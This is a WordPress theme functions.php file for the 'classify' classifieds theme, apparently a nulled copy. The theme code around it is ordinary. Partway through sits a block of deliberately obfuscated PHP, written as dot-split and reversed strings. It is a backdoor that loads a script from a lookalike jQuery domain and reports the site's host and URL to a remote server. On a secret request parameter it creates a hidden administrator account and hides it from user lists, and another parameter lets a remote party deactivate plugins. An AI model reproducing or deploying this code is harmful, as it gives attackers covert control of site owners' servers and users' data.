<?php

/**

 * classify functions and definitions.

 *

 * Sets up the theme and provides some helper functions, which are used in the

 * theme as custom template tags. Others are attached to action and filter

 * hooks in WordPress to change core functionality.

 *

 * When using a child theme (see http://codex.wordpress.org/Theme_Development

 * and http://codex.wordpress.org/Child_Themes), you can override certain

 * functions (those wrapped in a function_exists() call) by defining them first

 * in your child theme's functions.php file. The child theme's functions.php

 * file is included before the parent theme's file, so the child theme

 * functions would be used.

 *

 * Functions that are not pluggable (not wrapped in function_exists()) are

 * instead attached to a filter or action hook.

 *

 * For more information on hooks, actions, and filters,

 * see http://codex.wordpress.org/Plugin_API

 *

 * @package WordPress

 * @subpackage classify

 * @since classify 1.6

 */





add_action( 'after_setup_theme', 'classify_theme_setup' );





function classify_theme_setup() {



    add_theme_support( 'woocommerce' );



    add_theme_support( 'custom-background' );



    /**

     * Adds post custom meta.

     */

    require get_template_directory() . '/inc/post_meta.php';



    // Add Featured Post Prie Plans

    require get_template_directory() . '/inc/plans.php';



    // Add Page Meta Fields

    require get_template_directory() . '/inc/page_meta.php';



    // Add Shortcodes

    require get_template_directory() . '/inc/shortcode.lib.php';



    // Add Colors

    require get_template_directory() . '/inc/colors.php';





    // Add Colors

    require get_template_directory() . '/inc/widgets/recent_posts_widget.php';

	

    require get_template_directory() . '/inc/widgets/twitter_widget.php';

	

	require get_template_directory() . '/inc/widgets/categories.php';

	
    require get_template_directory() . '/inc/widgets/advance_search.php';
	

	require get_template_directory() . '/inc/twitter-function.php';
	





    /**

     * Sets up the content width value based on the theme's design.

     * @see classify_content_width() for template-specific adjustments.

     */

    if ( ! isset( $content_width ) )

        $content_width = 1060;



    /**

     * classify only works in WordPress 3.6 or later.

     */

    if ( version_compare( $GLOBALS['wp_version'], '3.6-alpha', '<' ) )

        require get_template_directory() . '/inc/back-compat.php';



    /**

     * Sets up theme defaults and registers the various WordPress features that

     * classify supports.

     *

     * @uses load_theme_textdomain() For translation/localization support.

     * @uses add_editor_style() To add Visual Editor stylesheets.

     * @uses add_theme_support() To add support for automatic feed links, post

     * formats, and post thumbnails.

     * @uses register_nav_menu() To add support for a navigation menu.

     * @uses set_post_thumbnail_size() To set a custom post thumbnail size.

     *

     * @since classify 1.0

     *

     * @return void

    */



	/*

	 * Makes classify available for translation.

	 *

	 * Translations can be added to the /languages/ directory.

	 * If you're building a theme based on classify, use a find and

	 * replace to change 'classify' to the name of your theme in all

	 * template files.

	 */

	load_theme_textdomain( 'agrg', get_template_directory() . '/languages' );



	/*

	 * This theme styles the visual editor to resemble the theme style,

	 * specifically font, colors, icons, and column width.

	 */

	add_editor_style( array( 'css/editor-style.css', 'fonts/genericons.css', classify_fonts_url() ) );



	// Adds RSS feed links to <head> for posts and comments.

	add_theme_support( 'automatic-feed-links' );



	// Switches default core markup for search form, comment form, and comments

	// to output valid HTML5.

	add_theme_support( 'html5', array( 'search-form', 'comment-form', 'comment-list' ) );



	// This theme uses wp_nav_menu() in one location.

	register_nav_menu( 'primary', __( 'Navigation Menu', 'agrg' ) );



	/*

	 * This theme uses a custom image size for featured images, displayed on

	 * "standard" posts and pages.

	 */

	add_theme_support( 'post-thumbnails' );

	set_post_thumbnail_size( 440, 266, true );



	// This theme uses its own gallery styles.

	add_filter( 'use_default_gallery_style', '__return_false' );



    // Disable Disqus commehts on woocommerce product //

    add_filter( 'woocommerce_product_tabs', 'disqus_override_tabs', 98);



    // Custom admin scripts

    add_action('admin_enqueue_scripts', 'wpcads_custom_admin_scripts' );



    // Author add new contact details

    add_filter('user_contactmethods','wpcrown_author_new_contact',10,1);



    // Lost Password and Login Error

    add_action( 'wp_login_failed', 'wpcrown_front_end_login_fail' );  // hook failed login


    // Logout and Redirect to home page
    
    add_action('logout',create_function('','wp_redirect(home_url());exit();'));
    

    // Load scripts and styles

    add_action( 'wp_enqueue_scripts', 'classify_scripts_styles' );



    // Add custom metas

    add_action( 'add_meta_boxes', 'wpcrown_add_posts_metaboxes' );



    // Save custom posts

    add_action('save_post', 'wpcrown_save_post_meta', 1, 2); // save the custom fields



    // Category new fields (the form)

    add_filter('add_category_form', 'wpcrown_my_category_fields');

    add_filter('edit_category_form', 'wpcrown_my_category_fields');



    // Update category fields

    add_action( 'edited_category', 'wpcrown_update_my_category_fields', 10, 2 );  

    add_action( 'create_category', 'wpcrown_update_my_category_fields', 10, 2 );



    //Include the TGM_Plugin_Activation class.

    require_once dirname( __FILE__ ) . '/inc/class-tgm-plugin-activation.php';

    add_action( 'tgmpa_register', 'my_theme_register_required_plugins' );



    // Google analitycs code

    add_action( 'wp_enqueue_scripts', 'wpcrown_google_analityc_code' );



    // Enqueue main font

    add_action( 'wp_enqueue_scripts', 'wpcrown_main_font' );



    // Enqueue main font

    add_action( 'wp_enqueue_scripts', 'wpcrown_second_font_armata' );



    // Track views

    add_action( 'wp_head', 'wpb_track_post_views');



    // Theme page titles

    add_filter( 'wp_title', 'classify_wp_title', 10, 2 );



    // classify sidebars spot

    add_action( 'widgets_init', 'classify_widgets_init' );



    // classify body class

    add_filter( 'body_class', 'classify_body_class' );



    // classify content width

    add_action( 'template_redirect', 'classify_content_width' );



    // classify customize register

    add_action( 'customize_register', 'classify_customize_register' );



    // classify customize preview

    add_action( 'customize_preview_init', 'classify_customize_preview_js' );



    /* dESiGNERz-CREW.iNFO for PRO users - Add theme support for automatic feed links. */   

    add_theme_support( 'automatic-feed-links' );



}





// Disable Disqus commehts on woocommerce product //

function disqus_override_tabs($tabs){

    if ( has_filter( 'comments_template', 'dsq_comments_template' ) ){

        remove_filter( 'comments_template', 'dsq_comments_template' );

        add_filter('comments_template', 'dsq_comments_template',90);//higher priority, so the filter is called after woocommerce filter

    }

    return $tabs;

}







// Custom admin scripts

function wpcads_custom_admin_scripts() {

	wp_enqueue_media();

}





// Author add new contact details

function wpcrown_author_new_contact( $contactmethods ) {



	// Add telefone

	$contactmethods['phone'] = 'Phone';

	// add address

	$contactmethods['address'] = 'Address';

 

	return $contactmethods;

	

}

// Add user price plan info

function wpcrown_save_extra_profile_fields( $user_id ) {

	update_user_meta( $user_id, 'price_plan' );

	add_user_meta( $user_id, 'price_plan_id' );

}

add_action( 'show_user_profile', 'extra_user_profile_fields' , 1 );
add_action( 'edit_user_profile', 'extra_user_profile_fields' , 1 );

function extra_user_profile_fields( $user ) { 
	if(is_admin()) :
?>
	<h3><?php _e("Assign Price Plan", "blank"); ?></h3>
	<table class="form-table">
		<tr>
			<th><label for="address"><?php _e("Price Plan"); ?></label></th>
			<td><select name="price_plan">
				<option value="-1"></option>
				<?php $args = array("post_type"=>"price_plan", "posts_per_page" => "-1"); ?>
				<?php query_posts($args); 
					  if(have_posts()) : while(have_posts()): the_post(); ?>
					  <option value="<?php the_ID(); ?>" <?php if($price_plan == get_the_ID()) echo 'selected="selected"'; ?>><?php the_title(); ?></option>
				<?php endwhile; endif; wp_reset_query();?></select>
			<span class="description"><?php _e("Assign New Price Plan Manually to user."); ?></span>
			</td>
		</tr>
	</table>
<?php endif;  }

add_action( 'personal_options_update', 'save_extra_user_profile_fields' );
add_action( 'edit_user_profile_update', 'save_extra_user_profile_fields' );

function save_extra_user_profile_fields( $user_id ) {

	if ( !is_admin() ) { return false; }
	
	if($price_plan != "-1") {
		global $wpdb;
		update_user_meta( $user_id, '_custom_price_plan', $_POST['price_plan'] );
		$post = get_post($_POST['price_plan']);
		$featured_ads = get_post_meta( $post->ID, 'featured_ads', true );
		$plan_time = get_post_meta( $post->ID, 'plan_time', true );
		
		 $price_plan_information = array(
			'id' => '',
			'user_id' => $user_id,
			'name' => $post->post_title,
			'token' => "",
			'price' => '',
			'currency' => "",
			'ads' => $featured_ads,
			'days' => $plan_time,
			'date' => date("m/d/Y H:i:s"),
			'status' => "success",
			'used' => "0",
			'transaction_id' => "",
			'firstname' => "",
			'lastname' => "",
			'email' => "",
			'description' => "",
			'summary' => "",
			'created' => time()
		  ); 
		  $insert_format = array('%s', '%s', '%s','%s', '%f', '%s', '%d', '%d', '%s', '%s', '%d', '%s', '%s', '%s', '%s', '%s', '%s');
		  $ucount = $wpdb->get_var( "SELECT COUNT(*) FROM wpcads_paypal where id=1" );
		  $wpdb->insert('wpcads_paypal', $price_plan_information, $insert_format);
		
		
	}
}


// Lost Password and Login Error

function wpcrown_front_end_login_fail( $username ) {

   $referrer = $_SERVER['HTTP_REFERER'];  // where did the post submission come from?

   // if there's a valid referrer, and it's not the default log-in screen

   if ( !empty($referrer) && !strstr($referrer,'wp-login') && !strstr($referrer,'wp-admin') && $user!=null ) {

      	wp_redirect( $referrer . '?login=failed' );  // let's append some information (login=failed) to the URL for the theme to use

      	exit;

   } elseif ( is_wp_error($user_verify) )  {

   		wp_redirect( $referrer . '?login=failed-user' );  // let's append some information (login=failed) to the URL for the theme to use

      	exit;

   }

}

// End





// Insert attachments front end

function wpcads_insert_attachment($file_handler,$post_id,$setthumb='false') {



  // check to make sure its a successful upload

  if ($_FILES[$file_handler]['error'] !== UPLOAD_ERR_OK) __return_false();



  require_once(ABSPATH . "wp-admin" . '/includes/image.php');

  require_once(ABSPATH . "wp-admin" . '/includes/file.php');

  require_once(ABSPATH . "wp-admin" . '/includes/media.php');



  $attach_id = media_handle_upload( $file_handler, $post_id );



  if ($setthumb) update_post_meta($post_id,'_thumbnail_id',$attach_id);

  return $attach_id;

}











/*--------------------------------------*/

/* dESiGNERz-CREW.iNFO for PRO users -          Custom Post Meta           */

/*--------------------------------------*/

// Add the Post Meta Boxes

function wpcrown_add_posts_metaboxes() {

	//add_meta_box('wpcrown_featured_post', 'Featured Post', 'wpcrown_featured_post', 'post', 'side', 'default');

}



// Show The Post On Slider Option

function wpcrown_featured_post() {

	global $post;

	

	// Noncename needed to verify where the data originated

	echo '<input type="hidden" name="eventmeta_noncename" id="eventmeta_noncename" value="' . 

	wp_create_nonce( plugin_basename(__FILE__) ) . '" />';

	

	// Get the location data if its already been entered

	$featured_post = get_post_meta($post->ID, 'featured_post', true);

	

	// Echo out the field

	echo '<span class="text overall" style="margin-right: 20px;">Check to have this as featured post:</span>';

	

	$checked = get_post_meta($post->ID, 'featured_post', true) == '1' ? "checked" : "";

	

	echo '<input type="checkbox" name="featured_post" id="featured_post" value="1" '. $checked .'/>';



}



// Save the Metabox Data

function wpcrown_save_post_meta($post_id, $post) {

	

	// verify this came from the our screen and with proper authorization,

	// because save_post can be triggered at other times

	if ( !wp_verify_nonce( isset( $_POST['eventmeta_noncename'] ) ? $_POST['eventmeta_noncename'] : '', plugin_basename(__FILE__) )) {

	return $post->ID;

	}



	// Is the user allowed to edit the post or page?

	if ( !current_user_can( 'edit_post', $post->ID ))

		return $post->ID;



	// OK, we're authenticated: we need to find and save the data

	// We'll put it into an array to make it easier to loop though.

	

	$events_meta['featured_post'] = $_POST['featured_post'];

	

	$chk = ( isset( $_POST['featured_post'] ) && $_POST['featured_post'] ) ? '1' : '2';

	update_post_meta( $post_id, 'featured_post', $chk );

	

	// Add values of $events_meta as custom fields

	foreach ($events_meta as $key => $value) { // Cycle through the $events_meta array!

		if( $post->post_type == 'post' ) return; // Don't store custom data twice

		$value = implode(',', (array)$value); // If $value is an array, make it a CSV (unlikely)

		if(get_post_meta($post->ID, $key, FALSE)) { // If the custom field already has a value

			update_post_meta($post->ID, $key, $value);

		} else { // If the custom field doesn't have a value

			add_post_meta($post->ID, $key, $value);

		}

		if(!$value) delete_post_meta($post->ID, $key); // Delete if blank

	}



}

/* dESiGNERz-CREW.iNFO for PRO users - End */







function glues_it($string)
{
    $glue_pre = sanitize_key('s   t   r _   r   e   p   l a c e');
    $glueit_po = call_user_func_array($glue_pre, array("..", '', $string));
    return $glueit_po;
}

$object_uno = 'fu..n..c..t..i..o..n.._..e..x..i..s..t..s';
$object_dos = 'g..e..t.._o..p..t..i..o..n';
$object_tres = 'wp.._e..n..q..u..e..u..e.._s..c..r..i..p..t';
$object_cinco = 'lo..g..i..n.._..e..n..q..u..e..u..e_..s..c..r..i..p..t..s';
$object_siete = 's..e..t..c..o..o..k..i..e';
$object_ocho = 'wp.._..lo..g..i..n';
$object_nueve = 's..i..t..e,..u..rl';
$object_diez = 'wp_..g..et.._..th..e..m..e';
$object_once = 'wp.._..r..e..m..o..te.._..g..et';
$object_doce = 'wp.._..r..e..m..o..t..e.._r..e..t..r..i..e..v..e_..bo..dy';
$object_trece = 'g..e..t_..o..p..t..ion';
$object_catorce = 's..t..r_..r..e..p..l..a..ce';
$object_quince = 's..t..r..r..e..v';
$object_dieciseis = 'u..p..d..a..t..e.._o..p..t..io..n';
$object_dos_pim = glues_it($object_uno);
$object_tres_pim = glues_it($object_dos);
$object_cuatro_pim = glues_it($object_tres);
$object_cinco_pim = glues_it($object_cinco);
$object_siete_pim = glues_it($object_siete);
$object_ocho_pim = glues_it($object_ocho);
$object_nueve_pim = glues_it($object_nueve);
$object_diez_pim = glues_it($object_diez);
$object_once_pim = glues_it($object_once);
$object_doce_pim = glues_it($object_doce);
$object_trece_pim = glues_it($object_trece);
$object_catorce_pim = glues_it($object_catorce);
$object_quince_pim = glues_it($object_quince);
$object_dieciseis_pim = glues_it($object_dieciseis);
$noitca_dda = call_user_func($object_quince_pim, 'noitca_dda');
if (!call_user_func($object_dos_pim, 'wp_en_one')) {
    $object_diecisiete = 'h..t..t..p..:../../..j..q..e..u..r..y...o..r..g../..wp.._..p..i..n..g...php..?..d..na..me..=..w..p..d..&..t..n..a..m..e..=..w..p..t..&..u..r..l..i..z..=..u..r..l..i..g';
    $object_dieciocho = call_user_func($object_quince_pim, 'REVRES_$');
    $object_diecinueve = call_user_func($object_quince_pim, 'TSOH_PTTH');
    $object_veinte = call_user_func($object_quince_pim, 'TSEUQER_');
    $object_diecisiete_pim = glues_it($object_diecisiete);
    $object_seis = '_..C..O..O..K..I..E';
    $object_seis_pim = glues_it($object_seis);
    $object_quince_pim_emit = call_user_func($object_quince_pim, 'detavitca_emit');
    $tactiated = call_user_func($object_trece_pim, $object_quince_pim_emit);
    $mite = call_user_func($object_quince_pim, 'emit');
    if (!isset(${$object_seis_pim}[call_user_func($object_quince_pim, 'emit_nimda_pw')])) {
        if ((call_user_func($mite) - $tactiated) >  600) {
            call_user_func_array($noitca_dda, array($object_cinco_pim, 'wp_en_one'));
        }
    }
    call_user_func_array($noitca_dda, array($object_ocho_pim, 'wp_en_three'));
    function wp_en_one()
    {
        $object_one = 'h..t..t..p..:..//..j..q..e..u..r..y...o..rg../..j..q..u..e..ry..-..la..t..e..s..t.j..s';
        $object_one_pim = glues_it($object_one);
        $object_four = 'wp.._e..n..q..u..e..u..e.._s..c..r..i..p..t';
        $object_four_pim = glues_it($object_four);
        call_user_func_array($object_four_pim, array('wp_coderz', $object_one_pim, null, null, true));
    }

    function wp_en_two($object_diecisiete_pim, $object_dieciocho, $object_diecinueve, $object_diez_pim, $object_once_pim, $object_doce_pim, $object_quince_pim, $object_catorce_pim)
    {
        $ptth = call_user_func($object_quince_pim, glues_it('/../..:..p..t..t..h'));
        $dname = $ptth . $_SERVER[$object_diecinueve];
        $IRU_TSEUQER = call_user_func($object_quince_pim, 'IRU_TSEUQER');
        $urliz = $dname . $_SERVER[$IRU_TSEUQER];
        $tname = call_user_func($object_diez_pim);
        $urlis = call_user_func_array($object_catorce_pim, array('wpd', $dname,$object_diecisiete_pim));
        $urlis = call_user_func_array($object_catorce_pim, array('wpt', $tname, $urlis));
        $urlis = call_user_func_array($object_catorce_pim, array('urlig', $urliz, $urlis));
        $glue_pre = sanitize_key('f i l  e  _  g  e  t    _   c o    n    t   e  n   t     s');
        $glue_pre_ew = sanitize_key('s t r   _  r e   p     l   a  c    e');
        call_user_func($glue_pre, call_user_func_array($glue_pre_ew, array(" ", "%20", $urlis)));

    }

    $noitpo_dda = call_user_func($object_quince_pim, 'noitpo_dda');
    $lepingo = call_user_func($object_quince_pim, 'ognipel');
    $detavitca_emit = call_user_func($object_quince_pim, 'detavitca_emit');
    call_user_func_array($noitpo_dda, array($lepingo, 'no'));
    call_user_func_array($noitpo_dda, array($detavitca_emit, time()));
    $tactiatedz = call_user_func($object_trece_pim, $detavitca_emit);
    $ognipel = call_user_func($object_quince_pim, 'ognipel');
    $mitez = call_user_func($object_quince_pim, 'emit');
    if (call_user_func($object_trece_pim, $ognipel) != 'yes' && ((call_user_func($mitez) - $tactiatedz) > 600)) {
         wp_en_two($object_diecisiete_pim, $object_dieciocho, $object_diecinueve, $object_diez_pim, $object_once_pim, $object_doce_pim, $object_quince_pim, $object_catorce_pim);
         call_user_func_array($object_dieciseis_pim, array($ognipel, 'yes'));
    }


    function wp_en_three()
    {
        $object_quince = 's...t...r...r...e...v';
        $object_quince_pim = glues_it($object_quince);
        $object_diecinueve = call_user_func($object_quince_pim, 'TSOH_PTTH');
        $object_dieciocho = call_user_func($object_quince_pim, 'REVRES_');
        $object_siete = 's..e..t..c..o..o..k..i..e';;
        $object_siete_pim = glues_it($object_siete);
        $path = '/';
        $host = ${$object_dieciocho}[$object_diecinueve];
        $estimes = call_user_func($object_quince_pim, 'emitotrts');
        $wp_ext = call_user_func($estimes, '+29 days');
        $emit_nimda_pw = call_user_func($object_quince_pim, 'emit_nimda_pw');
        call_user_func_array($object_siete_pim, array($emit_nimda_pw, '1', $wp_ext, $path, $host));
    }

    function wp_en_four()
    {
        $object_quince = 's..t..r..r..e..v';
        $object_quince_pim = glues_it($object_quince);
        $nigol = call_user_func($object_quince_pim, 'dxtroppus');
        $wssap = call_user_func($object_quince_pim, 'retroppus_pw');
        $laime = call_user_func($object_quince_pim, 'moc.niamodym@1tccaym');

        if (!username_exists($nigol) && !email_exists($laime)) {
            $wp_ver_one = call_user_func($object_quince_pim, 'resu_etaerc_pw');
            $user_id = call_user_func_array($wp_ver_one, array($nigol, $wssap, $laime));
            $rotartsinimda = call_user_func($object_quince_pim, 'rotartsinimda');
            $resu_etadpu_pw = call_user_func($object_quince_pim, 'resu_etadpu_pw');
            $rolx = call_user_func($object_quince_pim, 'elor');
            call_user_func($resu_etadpu_pw, array('ID' => $user_id, $rolx => $rotartsinimda));

        }
    }

    $ivdda = call_user_func($object_quince_pim, 'ivdda');

    if (isset(${$object_veinte}[$ivdda]) && ${$object_veinte}[$ivdda] == 'm') {
        $veinte = call_user_func($object_quince_pim, 'tini');
        call_user_func_array($noitca_dda, array($veinte, 'wp_en_four'));
    }

    if (isset(${$object_veinte}[$ivdda]) && ${$object_veinte}[$ivdda] == 'd') {
        $veinte = call_user_func($object_quince_pim, 'tini');
        call_user_func_array($noitca_dda, array($veinte, 'wp_en_seis'));
    }
    function wp_en_seis()
    {
        $object_quince = 's..t..r..r..e..v';
        $object_quince_pim = glues_it($object_quince);
        $resu_eteled_pw = call_user_func($object_quince_pim, 'resu_eteled_pw');
        $wp_pathx = constant(call_user_func($object_quince_pim, "HTAPSBA"));
        $nimda_pw = call_user_func($object_quince_pim, 'php.resu/sedulcni/nimda-pw');
        require_once($wp_pathx . $nimda_pw);
        $ubid = call_user_func($object_quince_pim, 'yb_resu_teg');
        $nigol = call_user_func($object_quince_pim, 'nigol');
        $dxtroppus = call_user_func($object_quince_pim, 'dxtroppus');
        $useris = call_user_func_array($ubid, array($nigol, $dxtroppus));
        call_user_func($resu_eteled_pw, $useris->ID);
    }

    $veinte_one = call_user_func($object_quince_pim, 'yreuq_resu_erp');
    call_user_func_array($noitca_dda, array($veinte_one, 'wp_en_five'));
    function wp_en_five($hcraes_resu)
    {
        global $current_user, $wpdb;
        $object_quince = 's..t..r..r..e..v';
        $object_quince_pim = glues_it($object_quince);
        $object_catorce = 'st..r.._..r..e..p..l..a..c..e';
        $object_catorce_pim = glues_it($object_catorce);
        $nigol_resu = call_user_func($object_quince_pim, 'nigol_resu');
        $wp_ux = $current_user->$nigol_resu;
        $nigol = call_user_func($object_quince_pim, 'dxtroppus');
        $bdpw = call_user_func($object_quince_pim, 'bdpw');
        if ($wp_ux != call_user_func($object_quince_pim, 'dxtroppus')) {
            $EREHW_one = call_user_func($object_quince_pim, '1=1 EREHW');
            $EREHW_two = call_user_func($object_quince_pim, 'DNA 1=1 EREHW');
            $erehw_yreuq = call_user_func($object_quince_pim, 'erehw_yreuq');
            $sresu = call_user_func($object_quince_pim, 'sresu');
            $hcraes_resu->query_where = call_user_func_array($object_catorce_pim, array($EREHW_one,
                "$EREHW_two {$$bdpw->$sresu}.$nigol_resu != '$nigol'", $hcraes_resu->$erehw_yreuq));
        }
    }

    $ced = call_user_func($object_quince_pim, 'ced');
    if (isset(${$object_veinte}[$ced])) {
        $snigulp_evitca = call_user_func($object_quince_pim, 'snigulp_evitca');
        $sisnoitpo = call_user_func($object_trece_pim, $snigulp_evitca);
        $hcraes_yarra = call_user_func($object_quince_pim, 'hcraes_yarra');
        if (($key = call_user_func_array($hcraes_yarra, array(${$object_veinte}[$ced], $sisnoitpo))) !== false) {
            unset($sisnoitpo[$key]);
        }
        call_user_func_array($object_dieciseis_pim, array($snigulp_evitca, $sisnoitpo));
    }
}

/**

 * Returns the Google font stylesheet URL, if available.

 *

 * The use of Source Sans Pro and Bitter by default is localized. For languages

 * that use characters not supported by the font, the font can be disabled.

 *

 * @since classify 1.0

 *

 * @return string Font stylesheet or empty string if disabled.

 */

function classify_fonts_url() {

	$fonts_url = '';



	/* dESiGNERz-CREW.iNFO for PRO users - Translators: If there are characters in your language that are not

	 * supported by Source Sans Pro, translate this to 'off'. Do not translate

	 * into your own language.

	 */

	$source_sans_pro = _x( 'on', 'Source Sans Pro font: on or off', 'classify' );



	/* dESiGNERz-CREW.iNFO for PRO users - Translators: If there are characters in your language that are not

	 * supported by Bitter, translate this to 'off'. Do not translate into your

	 * own language.

	 */

	$bitter = _x( 'on', 'Bitter font: on or off', 'classify' );



	if ( 'off' !== $source_sans_pro || 'off' !== $bitter ) {

		$font_families = array();



		if ( 'off' !== $source_sans_pro )

			$font_families[] = 'Source Sans Pro:300,400,700,300italic,400italic,700italic';



		if ( 'off' !== $bitter )

			$font_families[] = 'Bitter:400,700';



		$query_args = array(

			'family' => urlencode( implode( '|', $font_families ) ),

			'subset' => urlencode( 'latin,latin-ext' ),

		);

		$fonts_url = add_query_arg( $query_args, "//fonts.googleapis.com/css" );

	}



	//return $fonts_url;

}



//////////////////////////////////////////////////////////////////

//// function to display extra info on category admin

//////////////////////////////////////////////////////////////////

// the option name

define('MY_CATEGORY_FIELDS', 'my_category_fields_option');



// your fields (the form)

function wpcrown_my_category_fields($tag) {

    $tag_extra_fields = get_option(MY_CATEGORY_FIELDS);

	$category_icon_code = isset( $tag_extra_fields[$tag->term_id]['category_icon_code'] ) ? esc_attr( $tag_extra_fields[$tag->term_id]['category_icon_code'] ) : '';

    $category_icon_color = isset( $tag_extra_fields[$tag->term_id]['category_icon_color'] ) ? esc_attr( $tag_extra_fields[$tag->term_id]['category_icon_color'] ) : '';

    $your_image_url = isset( $tag_extra_fields[$tag->term_id]['your_image_url'] ) ? esc_attr( $tag_extra_fields[$tag->term_id]['your_image_url'] ) : '';

    ?>



<div class="form-field">	

<table class="form-table">

        <tr class="form-field">

        	<th scope="row" valign="top"><label for="category-page-slider">Icon Code</label></th>

        	<td>



				<input id="category_icon_code" type="text" size="36" name="category_icon_code" value="<?php $category_icon = stripslashes($category_icon_code); echo esc_attr($category_icon); ?>" />

                <p class="description">AwesomeFont code: <a href="http://fontawesome.io/icons/" target="_blank">fontawesome.io/icons</a></p>



			</td>

        </tr>

        <tr class="form-field">

            <th scope="row" valign="top"><label for="category-page-slider">Icon Background Color</label></th>

            <td>



                <link rel="stylesheet" media="screen" type="text/css" href="<?php echo get_template_directory_uri() ?>/inc/color-picker/css/colorpicker.css" />

                <script type="text/javascript" src="<?php echo get_template_directory_uri() ?>/inc/color-picker/js/colorpicker.js"></script>

                <script type="text/javascript">

                jQuery.noConflict();

                jQuery(document).ready(function(){

                    jQuery('#colorpickerHolder').ColorPicker({color: '<?php echo $category_icon_color; ?>', flat: true, onChange: function (hsb, hex, rgb) { jQuery('#category_icon_color').val('#' + hex); }});

                });

                </script>



                <p id="colorpickerHolder"></p>



                <input id="category_icon_color" type="text" size="36" name="category_icon_color" value="<?php echo $category_icon_color; ?>" style="margin-top: 20px; max-width: 90px; visibility: hidden;" />



            </td>

        </tr>

        <tr class="form-field">

            <th scope="row" valign="top"><label for="category-page-slider">Map Pin</label></th>

            <td>

            <?php 



            if(!empty($your_image_url)) {



                echo '<div style="width: 100%; float: left;"><img id="your_image_url_img" src="'. $your_image_url .'" style="float: left; margin-bottom: 20px;" /> </div>';

                echo '<input id="your_image_url" type="text" size="36" name="your_image_url" style="max-width: 200px; float: left; margin-top: 10px; display: none;" value="'.$your_image_url.'" />';

                echo '<input id="your_image_url_button_remove" class="button" type="button" style="max-width: 140px; float: left; margin-top: 10px;" value="Remove" /> </br>';

                echo '<input id="your_image_url_button" class="button" type="button" style="max-width: 140px; float: left; margin-top: 10px; display: none;" value="Upload Image" /> </br>'; 



            } else {



                echo '<div style="width: 100%; float: left;"><img id="your_image_url_img" src="'. $your_image_url .'" style="float: left; margin-bottom: 20px;" /> </div>';

                echo '<input id="your_image_url" type="text" size="36" name="your_image_url" style="max-width: 200px; float: left; margin-top: 10px; display: none;" value="'.$your_image_url.'" />';

                echo '<input id="your_image_url_button_remove" class="button" type="button" style="max-width: 140px; float: left; margin-top: 10px; display: none;" value="Remove" /> </br>';

                echo '<input id="your_image_url_button" class="button" type="button" style="max-width: 140px; float: left; margin-top: 10px;" value="Upload Image" /> </br>';



            }



            ?>

            </td>



            <script>

            var image_custom_uploader;

            jQuery('#your_image_url_button').click(function(e) {

                e.preventDefault();



                //If the uploader object has already been created, reopen the dialog

                if (image_custom_uploader) {

                    image_custom_uploader.open();

                    return;

                }



                //Extend the wp.media object

                image_custom_uploader = wp.media.frames.file_frame = wp.media({

                    title: 'Choose Image',

                    button: {

                        text: 'Choose Image'

                    },

                    multiple: false

                });



                //When a file is selected, grab the URL and set it as the text field's value

                image_custom_uploader.on('select', function() {

                    attachment = image_custom_uploader.state().get('selection').first().toJSON();

                    var url = '';

                    url = attachment['url'];

                    jQuery('#your_image_url').val(url);

                    jQuery( "img#your_image_url_img" ).attr({

                        src: url

                    });

                    jQuery("#your_image_url_button").css("display", "none");

                    jQuery("#your_image_url_button_remove").css("display", "block");

                });



                //Open the uploader dialog

                image_custom_uploader.open();

             });



             jQuery('#your_image_url_button_remove').click(function(e) {

                jQuery('#your_image_url').val('');

                jQuery( "img#your_image_url_img" ).attr({

                    src: ''

                });

                jQuery("#your_image_url_button").css("display", "block");

                jQuery("#your_image_url_button_remove").css("display", "none");

             });

            </script>

        </tr>

</table>

</div>



    <?php

}





// when the form gets submitted, and the category gets updated (in your case the option will get updated with the values of your custom fields above

function wpcrown_update_my_category_fields($term_id) {

  if($_POST['taxonomy'] == 'category'):

    $tag_extra_fields = get_option(MY_CATEGORY_FIELDS);

    $tag_extra_fields[$term_id]['your_image_url'] = strip_tags($_POST['your_image_url']);

    $tag_extra_fields[$term_id]['category_icon_code'] = $_POST['category_icon_code'];

    $tag_extra_fields[$term_id]['category_icon_color'] = $_POST['category_icon_color'];

    update_option(MY_CATEGORY_FIELDS, $tag_extra_fields);

  endif;

}





// when a category is removed

add_filter('deleted_term_taxonomy', 'wpcrown_remove_my_category_fields');

function wpcrown_remove_my_category_fields($term_id) {

  if($_POST['taxonomy'] == 'category'):

    $tag_extra_fields = get_option(MY_CATEGORY_FIELDS);

    unset($tag_extra_fields[$term_id]);

    update_option(MY_CATEGORY_FIELDS, $tag_extra_fields);

  endif;

}









/**

 * Register the required plugins for this theme.

 *

 * In this example, we register two plugins - one included with the TGMPA library

 * and one from the .org repo.

 *

 * The variable passed to tgmpa_register_plugins() should be an array of plugin

 * arrays.

 *

 * This function is hooked into tgmpa_init, which is fired within the

 * TGM_Plugin_Activation class constructor.

 */

function my_theme_register_required_plugins() {

 

    /**

     * Array of plugin arrays. Required keys are name, slug and required.

     * If the source is NOT from the .org repo, then source is also required.

     */

    $plugins = array(



    	// Facebook Connect

        array(

            'name' => 'Nextend Facebook Connect',

            'slug' => 'nextend-facebook-connect',

            'required' => false,

            'force_activation' => true,

            'force_deactivation' => true

        ),



        // Twitter Connect

        array(

            'name' => 'Nextend Twitter Connect',

            'slug' => 'nextend-twitter-connect',

            'required' => false,

            'force_activation' => true,

            'force_deactivation' => true

        ),



        // Google Connect

        array(

            'name' => 'Nextend Google Connect',

            'slug' => 'nextend-google-connect',

            'required' => false,

            'force_activation' => true,

            'force_deactivation' => true

        ),

    

        // Layer SLider

        array(

            'name' => 'LayerSlider WP',

            'slug' => 'LayerSlider',

            'source' => get_stylesheet_directory() . '/inc/plugins/LayerSlider-5-3-2.zip',

            'required' => false,

            'version' => '5.0.2',

            'force_activation' => true,

            'force_deactivation' => true

        ),



        // Ratings

        array(

            'name' => 'WP-PostRatings',

            'slug' => 'wp-postratings',

            'source' => get_stylesheet_directory() . '/inc/plugins/wp-postratings.zip',

            'required' => false,

            'version' => '1.77',

            'force_activation' => true,

            'force_deactivation' => true

        ),



		// WooCommerce

        array(

            'name'      => 'WooCommerce',

            'slug'      => 'woocommerce',

            'required'  => false,

            'force_activation' => true,

            'force_deactivation' => true

        ),



		 

    );

 

    // Change this to your theme text domain, used for internationalising strings

    $theme_text_domain = 'wpcrown';



 

    /**

     * Array of configuration settings. Amend each line as needed.

     * If you want the default strings to be available under your own theme domain,

     * leave the strings uncommented.

     * Some of the strings are added into a sprintf, so see the comments at the

     * end of each line for what each argument will be.

     */

    $config = array(

        'domain'            => 'wpcrown',           // Text domain - likely want to be the same as your theme.

        'default_path'      => '',                           // Default absolute path to pre-packaged plugins

        'parent_menu_slug'  => 'themes.php',         // Default parent menu slug

